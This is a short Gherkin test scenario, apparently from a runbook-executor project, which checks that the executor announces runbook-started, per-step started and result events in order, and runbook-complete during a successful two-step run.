  # Why: Lifecycle event stream — the full happy-path sequence of announcements
  @task:TASK-RBX-004
  @key-example @smoke
  Scenario: The executor announces the runbook lifecycle from start to completion
    Given a persisted runbook with two steps whose handlers succeed
    When the executor runs the runbook
    Then a runbook-started event should be announced once
    And a step-started and then a step-result event should be announced for each step in order
    And a runbook-complete event should be announced once

